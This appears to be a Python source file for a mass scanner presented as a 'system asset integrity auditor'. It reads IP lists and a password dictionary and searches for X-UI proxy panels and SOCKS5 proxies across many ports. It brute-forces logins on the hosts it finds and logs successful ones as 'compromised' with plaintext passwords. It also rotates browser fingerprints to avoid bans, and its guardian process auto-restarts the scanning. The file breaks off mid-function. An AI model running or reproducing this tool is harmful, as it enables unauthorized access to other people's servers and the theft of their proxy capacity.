import asyncio
import ipaddress
import random
import time
import sys
import os
import string
import json
import signal
import subprocess
import ctypes
import ssl
import re
import urllib.parse
from datetime import datetime

# ============================================================
#  SYSTEM ASSET INTEGRITY AUDITOR (SAIA) v23.5 - 天才猫
# ============================================================

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
STATE_FILE = os.path.join(BASE_DIR, "sys_audit_state.json")
LOG_FILE = os.path.join(BASE_DIR, "sys_audit_events.log")
REPORT_FILE = os.path.join(BASE_DIR, "audit_report.log")
NODE_FILE = os.path.join(BASE_DIR, "nodes.list")
FALLBACK_NODE_FILE = os.path.join(BASE_DIR, "ip.txt")
FALLBACK_NODE_FILE_UPPER = os.path.join(BASE_DIR, "IP.TXT")
TOKEN_FILE = os.path.join(BASE_DIR, "tokens.list")
FALLBACK_TOKEN_FILE = os.path.join(BASE_DIR, "pass.txt")
GUARDIAN_STATE_FILE = os.path.join(BASE_DIR, "sys_guardian_state.json")
MAX_LOG_BYTES = 2 * 1024 * 1024
MAX_REPORT_BYTES = 8 * 1024 * 1024
LOG_BACKUPS = 5
REPORT_BACKUPS = 3
STATE_FLUSH_INTERVAL = 1.0
MAX_SOCKET_CONCURRENCY = 600
ADAPT_CHECK_INTERVAL = 2.0
ADAPT_MIN_CONCURRENCY = 100
ADAPT_MAX_CONCURRENCY = 1000
ADAPT_STEP_UP = 50
ADAPT_STEP_DOWN = 100
ADAPT_LOW_MB = 800.0
ADAPT_HIGH_MB = 2048.0
EXPOSE_SECRET_IN_REPORT = True
DEFAULT_XUI_PORTS = "54321,2053"
DEFAULT_S5_PORTS = (
    "1080-1090,1111,2222,3333,4444,5555,6666,7777,8888,9999,"
    "1234,4321,8000,9000,6868,6688,8866,9527,1472,2583,3694,10000-10010"
)
DEFAULT_MIXED_PORTS = f"{DEFAULT_XUI_PORTS},{DEFAULT_S5_PORTS}"
ASN_DB_FILE = os.path.join(BASE_DIR, "GeoLite2-ASN.mmdb")
COUNTRY_DB_CANDIDATES = [
    os.path.join(BASE_DIR, "GeoLite2-Country.mmdb"),
    os.path.join(BASE_DIR, "geolite2-country.mmdb"),
]

# Anti-Ban 浏览器指纹池
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
]

# 视觉配置 (极光配色)
C_BOLD, C_W = "\033[1m", "\033[0m"
C_BLUE = "\033[38;5;39m"  # 边框蓝
C_CYAN = "\033[38;5;51m"  # 标题青
C_PROC = "\033[38;5;48m"  # 进度绿
C_WARN = "\033[38;5;214m"  # 警告橙
C_SUCC = "\033[38;5;46m"  # 成功绿
C_DIM = "\033[2m"  # 暗色

# ==================== 工具函数 ====================


def now_ts():
    return time.time()


async def close_writer(writer):
    if writer:
        try:
            writer.close()
            await asyncio.wait_for(writer.wait_closed(), timeout=1.0)
        except (OSError, asyncio.TimeoutError):
            pass


def save_state(path, state):
    try:
        with open(path + ".tmp", "w", encoding="utf-8") as f:
            json.dump(state, f, ensure_ascii=False, indent=2)
        os.replace(path + ".tmp", path)
    except OSError:
        pass


def load_state(path):
    if not os.path.exists(path):
        return {}
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except (OSError, json.JSONDecodeError):
        return {}


def rotate_file_if_needed(file_path, max_bytes, backup_count):
    try:
        if not os.path.exists(file_path):
            return
        if os.path.getsize(file_path) < max_bytes:
            return
        for i in range(backup_count, 0, -1):
            src = file_path if i == 1 else f"{file_path}.{i - 1}"
            dst = f"{file_path}.{i}"
            if os.path.exists(src):
                if os.path.exists(dst):
                    os.remove(dst)
                os.replace(src, dst)
    except OSError:
        pass


def append_rotating(file_path, text, max_bytes, backup_count):
    rotate_file_if_needed(file_path, max_bytes, backup_count)
    try:
        with open(file_path, "a", encoding="utf-8") as f:
            f.write(text)
    except OSError:
        pass


def log_event(msg):
    stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    append_rotating(LOG_FILE, f"[{stamp}] {msg}\n", MAX_LOG_BYTES, LOG_BACKUPS)


def read_last_lines(path, lines=50):
    if not os.path.exists(path):
        return ""
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            return "".join(f.readlines()[-lines:])
    except OSError:
        return ""


def mode_label(mode):
    return {1: "XUI专项", 2: "S5专项", 3: "深度全能"}.get(mode, str(mode))


def work_mode_label(work_mode):
    return {1: "探索", 2: "探索+验真", 3: "只验真"}.get(work_mode, str(work_mode))


def render_progress_bar(done, total, width=28):
    if total <= 0:
        return f"[{C_DIM}{'-' * width}{C_W}] 0%"
    ratio = max(0.0, min(1.0, done / total))
    fill = int(width * ratio)
    # 使用渐变色进度条
    bar_str = f"{C_PROC}{'━' * fill}{C_DIM}{'━' * (width - fill)}{C_W}"
    return f"[{bar_str}] {ratio * 100:5.1f}%"


def resolve_node_file():
    if os.path.exists(NODE_FILE):
        return NODE_FILE
    if os.path.exists(FALLBACK_NODE_FILE):
        return FALLBACK_NODE_FILE
    if os.path.exists(FALLBACK_NODE_FILE_UPPER):
        return FALLBACK_NODE_FILE_UPPER
    return None


def resolve_node_files():
    files = []
    if os.path.exists(NODE_FILE):
        files.append(NODE_FILE)
    if os.path.exists(FALLBACK_NODE_FILE):
        files.append(FALLBACK_NODE_FILE)
    if os.path.exists(FALLBACK_NODE_FILE_UPPER):
        files.append(FALLBACK_NODE_FILE_UPPER)
    return files


def resolve_token_file():
    if os.path.exists(TOKEN_FILE):
        return TOKEN_FILE
    if os.path.exists(FALLBACK_TOKEN_FILE):
        return FALLBACK_TOKEN_FILE
    return None


def mask_secret(secret):
    if EXPOSE_SECRET_IN_REPORT:
        return secret
    return "***"


def get_geo_info(ip):
    country, asn = "-", "-"
    try:
        ipaddress.ip_address(ip)
    except ValueError:
        return country, asn
    try:
        import geoip2.database
    except Exception:
        return country, asn

    if not hasattr(get_geo_info, "_country_reader"):
        reader = None
        for path in COUNTRY_DB_CANDIDATES:
            if os.path.exists(path):
                try:
                    reader = geoip2.database.Reader(path)
                except Exception:
                    reader = None
                break
        setattr(get_geo_info, "_country_reader", reader)

    if not hasattr(get_geo_info, "_asn_reader"):
        reader = None
        if os.path.exists(ASN_DB_FILE):
            try:
                reader = geoip2.database.Reader(ASN_DB_FILE)
            except Exception:
                reader = None
        setattr(get_geo_info, "_asn_reader", reader)

    cr = getattr(get_geo_info, "_country_reader")
    ar = getattr(get_geo_info, "_asn_reader")

    if cr:
        try:
            country = cr.country(ip).country.iso_code or "-"
        except Exception:
            pass
    if ar:
        try:
            num = ar.asn(ip).autonomous_system_number
            if num:
                asn = f"AS{num}"
        except Exception:
            pass
    return country, asn


def is_alive(pid):
    if not pid or pid <= 0:
        return False
    try:
        os.kill(pid, 0)
        return True
    except OSError:
        return False


def stop_process(pid):
    if not is_alive(pid):
        return False
    try:
        if os.name == "nt":
            subprocess.run(
                ["cmd", "/c", "taskkill", "/PID", str(pid), "/F"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                check=False,
            )
            return True
        os.kill(pid, signal.SIGTERM)
        return True
    except OSError:
        return False


def parse_ports(raw):
    ports = []
    try:
        for p in raw.replace(" ", "").split(","):
            if not p:
                continue
            if "-" in p:
                s, e = map(int, p.split("-", 1))
                s, e = max(1, min(65535, s)), max(1, min(65535, e))
                ports.extend(range(min(s, e), max(s, e) + 1))
            else:
                pn = int(p)
                if 1 <= pn <= 65535:
                    ports.append(pn)
    except ValueError:
        return []
    return sorted(set(ports))


def prompt_int(msg, default, min_value=None, max_value=None):
    while True:
        raw = input(msg).strip()
        if not raw:
            return default
        try:
            value = int(raw)
        except ValueError:
            print("输入无效，请输入整数。")
            continue
        if min_value is not None and value < min_value:
            print(f"输入过小。")
            continue
        if max_value is not None and value > max_value:
            print(f"输入过大。")
            continue
        return value


def prompt_float(msg, default, min_value=None):
    while True:
        raw = input(msg).strip()
        if not raw:
            return default
        try:
            value = float(raw)
        except ValueError:
            print("输入无效，请输入数字。")
            continue
        if min_value is not None and value < min_value:
            print(f"输入过小。")
            continue
        return value


def get_available_memory_mb():
    if os.name == "nt":

        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [
                ("dwLength", ctypes.c_ulong),
                ("dwMemoryLoad", ctypes.c_ulong),
                ("ullTotalPhys", ctypes.c_ulonglong),
                ("ullAvailPhys", ctypes.c_ulonglong),
                ("ullTotalPageFile", ctypes.c_ulonglong),
                ("ullAvailPageFile", ctypes.c_ulonglong),
                ("ullTotalVirtual", ctypes.c_ulonglong),
                ("ullAvailVirtual", ctypes.c_ulonglong),
                ("sullAvailExtendedVirtual", ctypes.c_ulonglong),
            ]

        stat = MEMORYSTATUSEX()
        stat.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
        if ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(stat)):
            return stat.ullAvailPhys / 1024 / 1024
        return None

    if sys.platform.startswith("freebsd"):
        try:
            page_size = int(
                subprocess.check_output(
                    ["sysctl", "-n", "hw.pagesize"], text=True
                ).strip()
            )
            free_pages = int(
                subprocess.check_output(
                    ["sysctl", "-n", "vm.stats.vm.v_free_count"], text=True
                ).strip()
            )
            inactive_pages = int(
                subprocess.check_output(
                    ["sysctl", "-n", "vm.stats.vm.v_inactive_count"], text=True
                ).strip()
            )
            cache_pages = int(
                subprocess.check_output(
                    ["sysctl", "-n", "vm.stats.vm.v_cache_count"], text=True
                ).strip()
            )
            return (
                (page_size * (free_pages + inactive_pages + cache_pages)) / 1024 / 1024
            )
        except:
            return None

    meminfo = "/proc/meminfo"
    if os.path.exists(meminfo):
        try:
            with open(meminfo, "r", encoding="utf-8", errors="replace") as f:
                for line in f:
                    if line.startswith("MemAvailable:"):
                        return int(line.split()[1]) / 1024
        except OSError:
            return None
    return 1024.0


class AdaptiveLimiter:
    def __init__(self, capacity):
        self._capacity = max(1, int(capacity))
        self._in_use = 0
        self._cv = asyncio.Condition()

    async def acquire(self):
        async with self._cv:
            while self._in_use >= self._capacity:
                await self._cv.wait()
            self._in_use += 1

    async def release(self):
        async with self._cv:
            if self._in_use > 0:
                self._in_use -= 1
            self._cv.notify_all()

    async def set_capacity(self, capacity):
        async with self._cv:
            self._capacity = max(1, int(capacity))
            self._cv.notify_all()

    async def snapshot(self):
        async with self._cv:
            return self._capacity, self._in_use

    async def __aenter__(self):
        await self.acquire()
        return self

    async def __aexit__(self, exc_type, exc, tb):
        await self.release()


def run_guardian(
    mode,
    work_mode,
    threads,
    ports_str,
    feed_int=0.05,
    check_interval=20,
    min_free_mb=256.0,
):
    save_state(
        GUARDIAN_STATE_FILE,
        {
            "pid": os.getpid(),
            "status": "running",
            "mode": mode,
            "work_mode": work_mode,
            "threads": threads,
            "ports": ports_str,
            "updated_at": now_ts(),
            "min_free_mb": min_free_mb,
            "check_interval": check_interval,
            "feed_int": feed_int,
        },
    )
    log_event(
        f"Guardian started mode={mode} work_mode={work_mode} threads={threads} ports={ports_str} "
    )
    last_restart_ts = 0.0
    min_restart_gap = max(10.0, float(check_interval))
    while True:
        mem_mb = get_available_memory_mb()
        st = load_state(STATE_FILE)
        if not is_alive(st.get("pid")):
            if mem_mb is None or mem_mb >= min_free_mb:
                now = now_ts()
                if now - last_restart_ts >= min_restart_gap:
                    subprocess.Popen(
                        [
                            sys.executable,
                            __file__,
                            "run",
                            str(mode),
                            str(work_mode),
                            str(threads),
                            ports_str,
                            str(feed_int),
                        ],
                        start_new_session=True,
                    )
                    last_restart_ts = now
            else:
                log_event(
                    f"Guardian wait: low memory {mem_mb:.0f}MB < {min_free_mb:.0f}MB"
                )
        gs = load_state(GUARDIAN_STATE_FILE)
        gs["updated_at"] = now_ts()
        gs["last_free_mb"] = mem_mb
        save_state(GUARDIAN_STATE_FILE, gs)
        time.sleep(check_interval)


# ==================== 审计核心 (逻辑不变，输出格式显密) ====================


async def audit_xui(ip, port, tokens, state, state_lock, work_mode, conn_limiter):
    async def fetch_page(path, use_ssl=False, method="GET", payload=""):
        writer = None
        try:
            ssl_ctx = ssl.create_default_context() if use_ssl else None
            if ssl_ctx is not None:
                ssl_ctx.check_hostname = False
                ssl_ctx.verify_mode = ssl.CERT_NONE
            async with conn_limiter:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(ip, port, ssl=ssl_ctx if use_ssl else None),
                    timeout=3.5,
                )
            ua = random.choice(USER_AGENTS)
            if method == "GET":
                req = f"GET {path} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {ua}\r\nConnection: close\r\n\r\n"
            else:
                req = f"POST {path} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {ua}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(payload)}\r\nConnection: close\r\n\r\n{payload}"
            writer.write(req.encode("utf-8", errors="ignore"))
            await writer.drain()
            return await asyncio.wait_for(reader.read(16384), timeout=4.0)
        except Exception:
            return b""
        finally:
            await close_writer(writer)

    def match_xui(data):
        low = data.lower()
        if b"x-ui" in low or b"3x-ui" in low or b"/xui" in low:
            return True
        if b"/login" in low and (
            b"username" in low or b"password" in low or b"signin" in low
        ):
            return True
        if b"/assets/ant-design-vue/antd.min.css" in low and (
            b"/assets/css/custom.min.css" in low
            or b"/assets/element-ui/theme-chalk/display.css" in low
        ):
            return True
        if b"-welcome</title>" in low and b"/assets/js/" in low:
            return True
        return False

    def check_auth_success(data):
        low = data.lower()
        no_space = low.replace(b" ", b"")
        if b'"success":true' in no_space:
            return True
        if b"set-cookie:session=" in no_space:
            return True
        if b"set-cookie:x-ui" in no_space:
            return True
        if b"http/1.1302" in no_space and b"location:/panel" in no_space:
            return True
        return False

    probes_to_try = [("/", False), ("/login", False), ("/", True), ("/login", True)]
    tried = set()
    found_candidates = []

    while probes_to_try:
        path, use_ssl = probes_to_try.pop(0)
        if (path, use_ssl) in tried:
            continue
        tried.add((path, use_ssl))
        data = await fetch_page(path, use_ssl=use_ssl)
        if not data:
            continue

        loc_match = re.search(rb"Location:\s*([^\r\n]+)", data, re.IGNORECASE)
        if loc_match:
            loc = loc_match.group(1).decode("utf-8", "ignore").strip()
            if loc.startswith("/") and (loc, use_ssl) not in tried:
                probes_to_try.append((loc, use_ssl))

        if match_xui(data):
            proto = "https" if use_ssl else "http"
            country, asn = get_geo_info(ip)
            login_path = path if "login" in path else path.rstrip("/") + "/login"
            candidate = (proto, use_ssl, country, asn, login_path)
            if candidate not in found_candidates:
                found_candidates.append(candidate)
            if work_mode in (1, 2):
                async with state_lock:
                    state["xui_found"] += 1
            if work_mode == 1:
                return f"[资产-面板存活] {ip}:{port} | {country} | {asn} | 协议:{proto} 路径:{path}"
            continue

    if found_candidates and tokens:
        for proto, use_ssl, country, asn, login_path in found_candidates:
            for u, p in tokens:
                payload = (
                    f"username={urllib.parse.quote(u)}&password={urllib.parse.quote(p)}"
                )
                login_resp = await fetch_page(
                    login_path, use_ssl=use_ssl, method="POST", payload=payload
                )
                if check_auth_success(login_resp):
                    async with state_lock:
                        state["xui_verified"] += 1
                    return f"[高危-后台沦陷] {ip}:{port}:{u}:{mask_secret(p)} | {country} | {asn} | 登录成功({proto})"

        if work_mode == 2:
            proto, _, country, asn, _ = found_candidates[0]
            return (
                f"[资产-面板存活] {ip}:{port} | {country} | {asn} | 字典未命中({proto})"
            )
    return None


async def audit_socks5(ip, port, tokens, state, state_lock, work_mode, conn_limiter):
    async def check_l7(reader, writer):
        try:
            req = b"GET / HTTP/1.1\r\nHost: 1.1.1.1\r\nUser-Agent: curl/7.68.0\r\nConnection: close\r\n\r\n"
            writer.write(req)
            await writer.drain()
            res = await asyncio.wait_for(reader.read(1024), timeout=3.0)
            if b"HTTP/1." in res or b"301 Moved" in res or b"<html>" in res.lower():
                return True
        except Exception:
            pass
        return False

    writer = None
    try:
        async with conn_limiter:
            r, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port), timeout=3.0
            )
        writer.write(b"\x05\x02\x00\x02")
        await writer.drain()
        res = await asyncio.wait_for(r.read(2), timeout=2.0)
        if not res or res[0] != 5:
            return None

        if res[1] == 0x00:
            if work_mode in (1, 2):
                async with state_lock:
                    state["s5_found"] += 1
            country, asn = get_geo_info(ip)
            if work_mode == 1:
                return f"[节点-可连通] {ip}:{port} | S5-OPEN | {country} | {asn}"

            await close_writer(writer)
            async with conn_limiter:
                r2, w2 = await asyncio.wait_for(
                    asyncio.open_connection(ip, port), timeout=2.5
                )
            try:
                start = time.perf_counter()
                w2.write(b"\x05\x01\x00\x01\x01\x01\x01\x01\x00\x50")
                await w2.drain()
                ack = await asyncio.wait_for(r2.read(10), timeout=2.5)
                if ack and ack[1] == 0x00:
                    lat = int((time.perf_counter() - start) * 1000)
                    l7_ok = await check_l7(r2, w2)
                    if l7_ok:
                        async with state_lock:
                            state["s5_verified"] += 1
                        return f"[优质-真穿透] {ip}:{port} | S5-OPEN | {country} | {asn} | RTT:{lat}ms"
                    elif work_mode == 2:
                        return f"[节点-可连通] {ip}:{port} | S5-OPEN | {country} | {asn} | 仅握手成功"
            finally:
                await close_writer(w2)

        if res[1] == 0x02 and tokens:
            if work_mode in (1, 2):
                async with state_lock:
                    state["s5_found"] += 1
            country, asn = get_geo_info(ip)
            if work_mode == 1:
                return f"[资产-加密节点] {ip}:{port} | S5-AUTH | {country} | {asn}"

            await close_writer(writer)
            for u, p in tokens:
                w3 = None
                try:
                    async with conn_limiter:
                        r3, w3 = await asyncio.wait_for(
                            asyncio.open_connection(ip, port), timeout=2.0
                        )
                    w3.write(b"\x05\x01\x02")
                    await w3.drain()
                    await r3.read(2)
                    w3.write(
                        b"\x01"
                        + bytes([len(u)])
                        + u.encode()
                        + bytes([len(p)])
                        + p.encode()
                    )
                    await w3.drain()
                    auth = await asyncio.wait_for(r3.read(2), timeout=2.0)
                    if auth and auth[1] == 0x00:
                        start = time.perf_counter()
                        w3.write(b"\x05\x01\x00\x01\x01\x01\x01\x01\x00\x50")
                        await w3.drain()
                        ack = await asyncio.wait_for(r3.read(10), timeout=2.5)
                        l7_ok = False
                        lat = 0
                        if ack and ack[1] == 0x00:
                            lat = int((time.perf_counter() - start) * 1000)
                            l7_ok = await check_l7(r3, w3)

                        if l7_ok:
                            async with state_lock:
                                state["s5_verified"] += 1
                            return f"[优质-真穿透] {ip}:{port}:{u}:{mask_secret(p)} | S5-AUTH | {country} | {asn} | RTT:{lat}ms"
                        elif work_mode == 2:
                            return f"[节点-可连通] {ip}:{port}:{u}:{mask_secret(p)} | S5-AUTH | {country} | {asn} | 无L7能力"
                except (asyncio.TimeoutError, OSError, ValueError):
                    continue
                finally:
                    await close_writer(w3)
    except (asyncio.TimeoutError, OSError, ValueError):
        pass
    finally:
        await close_writer(writer)
    return None


# ==================== 后台调度 ====================


async def internal_audit_process(mode, work_mode, threads, ports, feed_int):
    state = {
        "status": "running",
        "pid": os.getpid(),
        "total": 0,
        "done": 0,
        "xui_found": 0,
        "xui_verified": 0,
        "s5_found": 0,
        "s5_verified": 0,
        "work_mode": work_mode,
        "recent": [],
        "started_at": now_ts(),
        "current": "Initializing...",
    }
    save_state(STATE_FILE, state)
    state_lock = asyncio.Lock()
    flush_stop = asyncio.Event()

    q = asyncio.Queue(maxsize=max(threads * 4, 4096))
    adaptive_min = min(ADAPT_MIN_CONCURRENCY, max(10, threads))
    adaptive_max = max(adaptive_min, min(threads, ADAPT_MAX_CONCURRENCY))
    socket_limit = max(50, min(MAX_SOCKET_CONCURRENCY, adaptive_max))
    conn_limiter = AdaptiveLimiter(socket_limit)
    state["socket_limit"] = socket_limit
    state["socket_in_use"] = 0
    state["free_mb"] = get_available_memory_mb()

    async def flush_state_loop():
        while not flush_stop.is_set():
            await asyncio.sleep(STATE_FLUSH_INTERVAL)
            async with state_lock:
                save_state(STATE_FILE, state)

    async def adaptive_conn_loop():
        current_limit = socket_limit
        while not flush_stop.is_set():
            await asyncio.sleep(ADAPT_CHECK_INTERVAL)
            mem_mb = get_available_memory_mb()
            queue_size = q.qsize()
            next_limit = current_limit

            if mem_mb is not None and mem_mb < ADAPT_LOW_MB:
                next_limit = max(adaptive_min, current_limit - ADAPT_STEP_DOWN)
            elif mem_mb is not None and mem_mb > ADAPT_HIGH_MB and queue_size > 0:
                next_limit = min(adaptive_max, current_limit + ADAPT_STEP_UP)

            if next_limit != current_limit:
                await conn_limiter.set_capacity(next_limit)
                current_limit = next_limit

            cap, in_use = await conn_limiter.snapshot()
            async with state_lock:
                state["socket_limit"] = cap
                state["socket_in_use"] = in_use
                state["free_mb"] = round(mem_mb, 1) if mem_mb is not None else None

    flusher = asyncio.create_task(flush_state_loop())
    adaptive_task = asyncio.create_task(adaptive_conn_loop())

    tokens = []
    token_file = resolve_token_file()
    if token_file:
        with open(token_file, "r", encoding="utf-8", errors="ignore") as f:
            for l in f:
                l = l.strip()
                if l:
                    tokens.append(l.split(":", 1) if ":" in l else ["admin", l])

    async def worker():
        while True:
            ip = await q.get()
            if ip is None:
                q.task_done()
                break
            try:
                async with state_lock:
                    state["current"] = f"Auditing -> {ip}"
                x_done = mode == 2
                s_done = mode == 1
                for p in ports:
                    found_res = []
                    if mode in (1, 3) and not x_done:
                        x_r = await audit_xui(
                            ip, p, tokens, state, state_lock, work_mode, conn_limiter
                        )
                        if x_r:
                            found_res.append(x_r)
                            x_done = True
                    if mode in (2, 3) and not s_done:
                        s_r = await audit_socks5(
                            ip, p, tokens, state, state_lock, work_mode, conn_limiter
                        )
                        if s_r:
                            found_res.append(s_r)
                            s_done = True

                    if found_res:
                        async with state_lock:
                            for r in found_res:
                                state["recent"] = (state["recent"] + [r])[-6:]
                        for r in found_res:
                            append_rotating(
                                REPORT_FILE,
                                r + "\n",
                                MAX_REPORT_BYTES,
                                REPORT_BACKUPS,
                            )
                    if x_done and s_done:
                        break
                async with state_lock:
                    state["done"] += 1
                    state["current"] = f"Completed -> {ip}"
            finally:
                q.task_done()

    workers = [asyncio.create_task(worker()) for _ in range(threads)]
    node_files = resolve_node_files()
    if not node_files:
        state["status"] = "completed"
        flush_stop.set()
        await asyncio.gather(flusher, adaptive_task, return_exceptions=True)
        save_state(STATE_FILE, state)
        return

    seen_targets = set()
    try:
        for node_file in node_files:
            with open(node_file, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    for target in line.split():
                        if target in seen_targets:
                            continue
                        seen_targets.add(target)
                        async with state_lock:
                            state["current"] = f"Feeding target -> {target}"
                        await q.put(target)
                        async with state_lock:
                            state["total"] += 1
                        await asyncio.sleep(feed_int)
    except OSError:
        pass

    for _ in range(threads):
        await q.put(None)
    await asyncio.gather(*workers)
    state["status"] = "completed"
    state["current"] = "Completed"
    flush_stop.set()
    await asyncio.gather(flusher, adaptive_task, return_exceptions=True)
    save_state(STATE_FILE, state)


# ==================== 管理界面 (极光UI版) ====================


def main_console():
    # 动态加载旋转图标
    spinner = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    spin_idx = 0

    while True:
        os.system("cls" if os.name == "nt" else "clear")
        s = load_state(STATE_FILE)
        g = load_state(GUARDIAN_STATE_FILE)
        p_status = (
            f"{C_SUCC}ON{C_BLUE}" if is_alive(s.get("pid")) else f"{C_DIM}OFF{C_BLUE}"
        )
        g_status = (
            f"{C_SUCC}ON{C_BLUE}" if is_alive(g.get("pid")) else f"{C_DIM}OFF{C_BLUE}"
        )

        # 极光面板头部
        print(
            f"{C_BLUE}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓{C_W}"
        )
        print(
            f"{C_BLUE}┃ {C_BOLD}SAIA MASTER CONSOLE v23.5{C_W} | {C_CYAN}旗舰穿透版{C_BLUE}                 ┃{C_W}"
        )
        print(
            f"{C_BLUE}┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫{C_W}"
        )
        print(
            f"{C_BLUE}┃ {C_W}审计引擎: {p_status:<17} {C_BLUE}┃ {C_W}自启守护: {g_status:<17} {C_BLUE}┃{C_W}"
        )
        print(
            f"{C_BLUE}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{C_W}"
        )

        print(f"\n{C_CYAN} [ 核心指令 ]{C_W}")
        print(f" 1) 启动审计  5) 停止审计  9) 退出系统")
        print(f" 2) 监控面板  6) 启动守护")
        print(f" 3) 查看结果  8) 停止守护")
        print(f" 4) 查看日志")

        c = input(
            f"\n{C_BLUE}┌──({C_W}root@saia{C_BLUE})-[{C_W}~/menu{C_BLUE}]\n└─{C_WARN}# {C_W}"
        ).strip()

        if c == "1":
            print(f"\n{C_CYAN}>>> 配置审计参数{C_W}")
            m = prompt_int(
                "模式 (1.XUI / 2.S5 / 3.全能): ", default=3, min_value=1, max_value=3
            )
            wm = prompt_int(
                "深度 (1.探索 / 2.探索+验真 / 3.只留极品): ",
                default=2,
                min_value=1,
                max_value=3,
            )
            th = prompt_int(
                "线程 (建议 50-300): ", default=20, min_value=1, max_value=1000
            )
            default_ports = (
                DEFAULT_XUI_PORTS
                if m == 1
                else DEFAULT_S5_PORTS
                if m == 2
                else DEFAULT_MIXED_PORTS
            )
            ps = input(f"端口 (默认 {default_ports[:20]}...): ") or default_ports
            if not parse_ports(ps):
                print("端口无效")
                time.sleep(1)
                continue
            subprocess.Popen(
                [sys.executable, __file__, "run", str(m), str(wm), str(th), ps, "0.02"],
                start_new_session=True,
            )
            print(f"{C_SUCC}>>> 核心已启动!{C_W}")
            time.sleep(1)

        elif c == "2":
            try:
                while True:
                    st = load_state(STATE_FILE)
                    done = st.get("done", 0)
                    total = st.get("total", 0)
                    bar = render_progress_bar(done, total)
                    spin_char = spinner[spin_idx % len(spinner)]
                    spin_idx += 1

                    os.system("cls" if os.name == "nt" else "clear")
                    # 极光监控仪表盘
                    print(
                        f"{C_BLUE}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓{C_W}"
                    )
                    print(
                        f"{C_BLUE}┃ {C_W}{spin_char} {C_BOLD}REAL-TIME MONITOR{C_W}       | {C_DIM}Mode: {work_mode_label(st.get('work_mode', 2))}{C_BLUE}       ┃{C_W}"
                    )
                    print(
                        f"{C_BLUE}┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫{C_W}"
                    )
                    # XUI 行 (去除高光，统一对齐)
                    print(
                        f"{C_BLUE}┃ {C_W}X-UI 面板  {C_BLUE}|{C_W} 发现: {C_CYAN}{st.get('xui_found', 0):<6}{C_W} | 沦陷: {C_WARN}{st.get('xui_verified', 0):<6}{C_BLUE} ┃{C_W}"
                    )
                    # S5 行 (去除高光，统一对齐)
                    print(
                        f"{C_BLUE}┃ {C_W}SOCKS5代理 {C_BLUE}|{C_W} 连通: {C_CYAN}{st.get('s5_found', 0):<6}{C_W} | 穿透: {C_SUCC}{st.get('s5_verified', 0):<6}{C_BLUE} ┃{C_W}"
                    )
                    print(
                        f"{C_BLUE}┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫{C_W}"
                    )
                    print(
                        f"{C_BLUE}┃ {C_W}当前动作   {C_BLUE}|{C_DIM} {st.get('current', '-')[:36]:<36} {C_BLUE}┃{C_W}"
                    )
                    print(
                        f"{C_BLUE}┃ {C_W}总体进度   {C_BLUE}|{C_W} {bar} {C_BLUE}┃{C_W}"
                    )
                    print(
                        f"{C_BLUE}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{C_W}"
                    )
                    print(f"\n{C_DIM}按 Ctrl+C 返回主菜单...{C_W}")
                    time.sleep(0.5)
            except KeyboardInterrupt:
                pass

        elif c == "3":
            output = read_last_lines(REPORT_FILE, lines=50)
            print(f"\n{C_CYAN}>>> 最近 50 条结果{C_W}\n")
            print(output if output else f"{C_DIM}暂无数据{C_W}")
            input(f"\n{C_BLUE}按回车返回...{C_W}")

        elif c == "4":
            output = read_last_lines(LOG_FILE, lines=50)
            print(f"\n{C_CYAN}>>> 系统日志{C_W}\n")
            print(output if output else f"{C_DIM}暂无日志{C_W}")
            input(f"\n{C_BLUE}按回车返回...{C_W}")

        elif c == "5":
            pid = load_state(STATE_FILE).get("pid")
            if stop_process(pid):
                print(f"{C_WARN}>>> 审计任务已强制停止{C_W}")
            else:
                print(f"{C_DIM}没有运行中的任务{C_W}")
            time.sleep(1)

        elif c == "6":
            # 守护进程启动逻辑 (保持不变)
            m = prompt_int("守护模式 (3): ", default=3, min_value=1, max_value=3)
            th = prompt_int("守护线程 (10): ", default=10, min_value=1, max_value=1000)
            default_ports = (
                DEFAULT_XUI_PORTS
                if m == 1
                else DEFAULT_S5_PORTS
                if m == 2
                else DEFAULT_MIXED_PORTS
            )
            ps = input(f"端口 (默认 {default_ports[:20]}...): ") or default_ports
            if not parse_ports(ps):
                print("端口无效")
                time.sleep(1)
                continue
            subprocess.Popen(
                [
                    sys.executable,
                    __file__,
                    "guardian",
                    str(m),
                    "2",
                    str(th),
